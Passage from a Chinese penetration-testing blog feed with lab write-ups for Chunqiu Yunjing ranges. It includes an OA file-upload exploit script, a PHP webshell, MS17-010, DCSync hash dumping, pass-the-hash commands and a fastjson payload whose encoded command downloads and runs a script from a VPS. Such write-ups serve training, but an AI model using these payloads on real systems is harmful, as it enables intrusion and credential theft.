标题:无标题 重定向地址: http://172.22.1.18?m=login</span><br><span class="line">[2025-04-02 18:08:54] [SUCCESS] 发现漏洞 172.22.1.21 [Windows Server 2008 R2 Enterprise 7601 Service Pack 1] MS17-010</span><br><span class="line">[2025-04-02 18:08:55] [SUCCESS] 目标: http://172.22.1.15:80</span><br><span class="line">  漏洞类型: poc-yaml-thinkphp5023-method-rce</span><br><span class="line">  漏洞名称: poc1</span><br><span class="line">  详细信息:</span><br><span class="line">links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.15 thinkphprce 已经拿下 </span><br><span class="line">172.22.1.21 XIAORANG-WIN7.xiaorang.lab MS17-010 </span><br><span class="line">172.22.1.2 DC01 </span><br><span class="line">172.22.1.18 XIAORANG-OA01 信呼协同办公系统</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/18.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/19.png"></p><p>弱口令也可以直接登陆成功</p><p>admin</p><p>admin123</p><p>直接搜索信呼协同办公系统有没有历史漏洞</p><p>这里找到一个poc</p><p><a href="https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E4%BF%A1%E5%91%BCOA-qcloudCosAction.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md">https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E4%BF%A1%E5%91%BCOA-qcloudCosAction.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md</a></p><p>前面挂载好代理了</p><p>修改一下exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一句话木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>($_POST[<span class="string">&quot;1&quot;</span>]);?&gt;</span><br></pre></td></tr></table></figure><p>因为建立好代理了，所以我们可以直接使用物理机对其内网进行攻击，上传木马</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/20.png"></p><p>使用蚁剑连接</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/21.png"></p><p>连接发现直接就是system权限，也就是拿下第二台主机</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/22.png"></p><p>找到第二个flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.15 thinkphprce 已经拿下 </span><br><span class="line">172.22.1.21 XIAORANG-WIN7.xiaorang.lab MS17-010 </span><br><span class="line">172.22.1.2 DC01 </span><br><span class="line">172.22.1.18 XIAORANG-OA01 信呼协同办公系统   已经拿下</span><br></pre></td></tr></table></figure><p>现在就剩域控DC01和172.22.1.21这两台没有拿下了</p><p>fscan探测出172.22.1.21有ms17-010，经典的永恒之蓝的漏洞</p><p>我们使用kali中的msf直接打</p><p>使用代理打开 这样待会的rhost就可以直接填写内网地址了，就不需要再在里面配置代理了</p><p>set proxies <font style="color:rgb(230, 192, 123);">set</font> proxies socks5:xx.xx.xx.xx:xxxx</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/23.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/24.png"></p><p>稍等一会 攻击成功 shell回来了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/25.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server</span><br><span class="line">[DC] Exporting domain &#x27;xiaorang.lab&#x27;</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502krbtgtfb812eea13a18b7fcdb8e6d67ddc205b514</span><br><span class="line">1106Marcuse07510a4284b3c97c8e7dee970918c5c512</span><br><span class="line">1107Charlesf6a9881cd5ae709abb4ac9ab87f24617512</span><br><span class="line">1000DC01$87628a76c2de25114bb8942b7e25753c532480</span><br><span class="line">500Administrator10cf89a850fb1cdbe6bb432b859164c8512</span><br><span class="line">1104XIAORANG-OA01$2fbe83b054261d4b6f4c080e1e0129744096</span><br><span class="line">1108XIAORANG-WIN7$e0c789db6b3e4df88dfdb763ad7f75f64096</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现在进行PTH(pass the hash)攻击</p><p>使用现成的脚本进行攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#使用 crackmapexec脚本通过smb服务执行“type Users\Administrator\flag\flag03.txt”这条命令</span><br><span class="line">proxychains crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br><span class="line"></span><br><span class="line">#或者使用impacket-0.12.0中的wmi执行命令</span><br><span class="line">impacket-wmiexec xiaorang.lab/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p> WMI全称”windows管理规范”，从win2003开始一直存在。它原本的作用是方便管理员对windows主机进行管理。</p></blockquote><p>获取重要文件</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/26.png"></p><p><font style="color:rgb(238, 238, 238);background-color:rgb(0, 0, 0);">flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}</font></p><p><font style="color:rgb(238, 238, 238);background-color:rgb(0, 0, 0);"></font></p><p><font style="color:rgb(238, 238, 238);background-color:rgb(0, 0, 0);"></font></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/27.jpeg" alt="画板"></p><p><font style="color:rgb(238, 238, 238);background-color:rgb(0, 0, 0);"></font></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/28.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜-Exchange</title>
      <link href="/post/633b4305.html"/>
      <url>/post/633b4305.html</url>
      
        <content type="html"><![CDATA[<p>参考wp：</p><p><a href="https://www.cnblogs.com/kingbridge/articles/16720318.html">https://www.cnblogs.com/kingbridge/articles/16720318.html</a></p><p><a href="https://zer0peach.github.io/2024/12/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/">https://zer0peach.github.io/2024/12/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/</a></p><p>开局一个ip39.99.153.253</p><p>fscan开扫</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\fscan2.<span class="number">0.1</span>&gt;fscan.exe <span class="literal">-h</span> <span class="number">39.99</span>.<span class="number">153.253</span></span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /    │</span></span><br><span class="line"><span class="string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span></span><br><span class="line"><span class="string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span></span><br><span class="line"><span class="string">└──────────────────────────────────────────────┘</span></span><br><span class="line"><span class="string">      Fscan Version: 2.0.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2025-05-20 15:29:22] [INFO] 开始信息扫描</span></span><br><span class="line"><span class="string">[2025-05-20 15:29:22] [INFO] 最终有效主机数量: 1</span></span><br><span class="line"><span class="string">[2025-05-20 15:29:22] [INFO] 开始主机扫描</span></span><br><span class="line"><span class="string">[2025-05-20 15:29:22] [INFO] 使用所有可用插件（已排除本地敏感插件）</span></span><br><span class="line"><span class="string">[2025-05-20 15:29:22] [INFO] 有效端口数量: 233</span></span><br><span class="line"><span class="string">[2025-05-20 15:29:22] [SUCCESS] 端口开放 39.99.153.253:22</span></span><br><span class="line"><span class="string">[2025-05-20 15:29:22] [SUCCESS] 端口开放 39.99.153.253:80</span></span><br><span class="line"><span class="string">[2025-05-20 15:29:40] [SUCCESS] 端口开放 39.99.153.253:8000</span></span><br><span class="line"><span class="string">[2025-05-20 15:30:14] [INFO] 存活端口数量: 3</span></span><br><span class="line"><span class="string">[2025-05-20 15:30:14] [INFO] 开始漏洞扫描</span></span><br><span class="line"><span class="string">[2025-05-20 15:30:14] [SUCCESS] 网站标题 http://39.99.153.253      状态码:200 长度:19813  标题:lumia</span></span><br><span class="line"><span class="string">[2025-05-20 15:30:15] [SUCCESS] 网站标题 http://39.99.153.253:8000 状态码:302 长度:0      标题:无标 题 重定向地址: http://39.99.153.253:8000/login.html</span></span><br><span class="line"><span class="string">[2025-05-20 15:30:15] [SUCCESS] 网站标题 http://39.99.153.253:8000/login.html 状态码:200 长度:5662   标题:Lumia ERP</span></span><br><span class="line"><span class="string">[2025-05-20 15:30:47] [SUCCESS] 扫描已完成: 5/5</span></span><br></pre></td></tr></table></figure><p>等待扫的过程中已经看到了80端口，那么我们先访问一下80端口</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/1.png"></p><p>是个网站的首页</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/2.png"></p><p>扫出来了个登录框，尝试弱口令登录admin</p><p>123456直接登录成功</p><p>搜一下这个cms有没有历史漏洞吧，而且这是个华夏ERP的改版</p><p>可以打很多历史漏洞</p><p>发现有挺多的</p><p><a href="https://www.freebuf.com/articles/web/347135.html">https://www.freebuf.com/articles/web/347135.html</a></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/3.png"></p><p>还找到了个直接未授权泄露账密的，但是我们直接弱口令进来了</p><p><a href="http://39.99.153.253:8000/user/getAllList;.ico">http://39.99.153.253:8000/user/getAllList;.ico</a></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/4.png"></p><p>那么就打rce吧</p><p>就那fastjson打吧</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/5.png"></p><p>漏洞点在user&#x2F;list?search</p><p>那么我先探测一下是否存在fastjson，记得url编码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;rfklfplpjl.lfcx.eu.org&quot;</span>&#125; </span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/6.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /user/list?search=%<span class="number">7</span>b%<span class="number">22</span>%<span class="number">40</span>%<span class="number">74</span>%<span class="number">79</span>%<span class="number">70</span>%<span class="number">65</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">6</span>a%<span class="number">61</span>%<span class="number">76</span>%<span class="number">61</span>%<span class="number">2</span>e%<span class="number">6</span>e%<span class="number">65</span>%<span class="number">74</span>%<span class="number">2</span>e%<span class="number">49</span>%<span class="number">6</span>e%<span class="number">65</span>%<span class="number">74</span>%<span class="number">34</span>%<span class="number">41</span>%<span class="number">64</span>%<span class="number">64</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">22</span>%<span class="number">2</span>c%<span class="number">22</span>%<span class="number">76</span>%<span class="number">61</span>%<span class="number">6</span>c%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">72</span>%<span class="number">66</span>%<span class="number">6</span>b%<span class="number">6</span>c%<span class="number">66</span>%<span class="number">70</span>%<span class="number">6</span>c%<span class="number">70</span>%<span class="number">6</span>a%<span class="number">6</span>c%<span class="number">2</span>e%<span class="number">6</span>c%<span class="number">66</span>%<span class="number">63</span>%<span class="number">78</span>%<span class="number">2</span>e%<span class="number">65</span>%<span class="number">75</span>%<span class="number">2</span>e%<span class="number">6</span>f%<span class="number">72</span>%<span class="number">67</span>%<span class="number">22</span>%<span class="number">7</span>d  HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">39.99</span>.<span class="number">153.253</span>:<span class="number">8000</span></span><br><span class="line">Accept: application/json, text/javascript, */*; q=<span class="number">0.01</span></span><br><span class="line">X<span class="literal">-Requested-With</span>: XMLHttpRequest</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate</span><br><span class="line">Referer: http://<span class="number">39.99</span>.<span class="number">153.253</span>:<span class="number">8000</span>/pages/manage/user.html</span><br><span class="line">Cookie: JSESSIONID=<span class="number">43</span>E44DB890C5656C424FC98D0703203D; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=<span class="number">1747726313</span>; HMACCOUNT=<span class="number">9835</span>B12E3CB67BEC; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=<span class="number">1747726418</span></span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">136.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>收到了，那么我们尝试利用</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/7.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>: &#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line"><span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,</span><br><span class="line"><span class="string">&quot;hostToConnectTo&quot;</span>: <span class="string">&quot;vpsIP地址&quot;</span>,</span><br><span class="line"><span class="string">&quot;portToConnectTo&quot;</span>: <span class="number">3306</span>,</span><br><span class="line"><span class="string">&quot;info&quot;</span>: &#123;</span><br><span class="line"><span class="string">&quot;user&quot;</span>: <span class="string">&quot;yso_CommonsCollections6_bash -c &#123;echo,base64编码后的命令&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>,</span><br><span class="line"><span class="string">&quot;statementInterceptors&quot;</span>: <span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,</span><br><span class="line"><span class="string">&quot;autoDeserialize&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line"><span class="string">&quot;NUM_HOSTS&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_42077227/article/details/130236560">https://blog.csdn.net/qq_42077227&#x2F;article&#x2F;details&#x2F;130236560</a></p><p><font style="color:rgb(77, 77, 77);">在vps服务器上下载evil-mysql-server、ysoserial-all.jar工具回来放在同一目录下，执行命令运行</font></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/8.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./evil<span class="literal">-mysql-server</span> <span class="literal">-addr</span> <span class="number">3306</span> <span class="literal">-java</span> java <span class="literal">-ysoserial</span> ysoserial<span class="literal">-all</span>.jar</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/9.png"></p><p>这是payload</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>: &#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line"><span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,</span><br><span class="line"><span class="string">&quot;hostToConnectTo&quot;</span>: <span class="string">&quot;vpsIP地址&quot;</span>,</span><br><span class="line"><span class="string">&quot;portToConnectTo&quot;</span>: <span class="number">3306</span>,</span><br><span class="line"><span class="string">&quot;info&quot;</span>: &#123;</span><br><span class="line"><span class="string">&quot;user&quot;</span>: <span class="string">&quot;yso_CommonsCollections6_bash -c &#123;echo,base64编码后的命令&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>,</span><br><span class="line"><span class="string">&quot;statementInterceptors&quot;</span>: <span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,</span><br><span class="line"><span class="string">&quot;autoDeserialize&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line"><span class="string">&quot;NUM_HOSTS&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>: &#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line"><span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,</span><br><span class="line"><span class="string">&quot;hostToConnectTo&quot;</span>: <span class="string">&quot;47.113.229.136&quot;</span>,</span><br><span class="line"><span class="string">&quot;portToConnectTo&quot;</span>: <span class="number">3306</span>,</span><br><span class="line"><span class="string">&quot;info&quot;</span>: &#123;</span><br><span class="line"><span class="string">&quot;user&quot;</span>: <span class="string">&quot;yso_CommonsCollections6_bash -c &#123;echo,KGN1cmwgLWZzU0wgLW0xODAgaHR0cDovLzQ3LjExMy4yMjkuMTM2Ojg4OTkvc2x0fHx3Z2V0IC1UMTgwIC1xIGh0dHA6Ly80Ny4xMTMuMjI5LjEzNjo4ODk5L3NsdCl8c2g=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>,</span><br><span class="line"><span class="string">&quot;statementInterceptors&quot;</span>: <span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,</span><br><span class="line"><span class="string">&quot;autoDeserialize&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line"><span class="string">&quot;NUM_HOSTS&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里我直接起个vshell直接上线了</p><p>记得编码</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/10.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/11.png"></p><p>记得vps开启端口</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /user/list?search=%<span class="number">7</span>b%<span class="number">0</span>a%<span class="number">09</span>%<span class="number">22</span>%<span class="number">6</span>e%<span class="number">61</span>%<span class="number">6</span>d%<span class="number">65</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">20</span>%<span class="number">7</span>b%<span class="number">0</span>a%<span class="number">09</span>%<span class="number">09</span>%<span class="number">22</span>%<span class="number">40</span>%<span class="number">74</span>%<span class="number">79</span>%<span class="number">70</span>%<span class="number">65</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">20</span>%<span class="number">22</span>%<span class="number">6</span>a%<span class="number">61</span>%<span class="number">76</span>%<span class="number">61</span>%<span class="number">2</span>e%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">6</span>e%<span class="number">67</span>%<span class="number">2</span>e%<span class="number">41</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">6</span>f%<span class="number">43</span>%<span class="number">6</span>c%<span class="number">6</span>f%<span class="number">73</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">62</span>%<span class="number">6</span>c%<span class="number">65</span>%<span class="number">22</span>%<span class="number">2</span>c%<span class="number">0</span>a%<span class="number">09</span>%<span class="number">09</span>%<span class="number">22</span>%<span class="number">40</span>%<span class="number">74</span>%<span class="number">79</span>%<span class="number">70</span>%<span class="number">65</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">20</span>%<span class="number">22</span>%<span class="number">63</span>%<span class="number">6</span>f%<span class="number">6</span>d%<span class="number">2</span>e%<span class="number">6</span>d%<span class="number">79</span>%<span class="number">73</span>%<span class="number">71</span>%<span class="number">6</span>c%<span class="number">2</span>e%<span class="number">6</span>a%<span class="number">64</span>%<span class="number">62</span>%<span class="number">63</span>%<span class="number">2</span>e%<span class="number">4</span>a%<span class="number">44</span>%<span class="number">42</span>%<span class="number">43</span>%<span class="number">34</span>%<span class="number">43</span>%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">6</span>e%<span class="number">65</span>%<span class="number">63</span>%<span class="number">74</span>%<span class="number">69</span>%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">22</span>%<span class="number">2</span>c%<span class="number">0</span>a%<span class="number">09</span>%<span class="number">09</span>%<span class="number">22</span>%<span class="number">68</span>%<span class="number">6</span>f%<span class="number">73</span>%<span class="number">74</span>%<span class="number">54</span>%<span 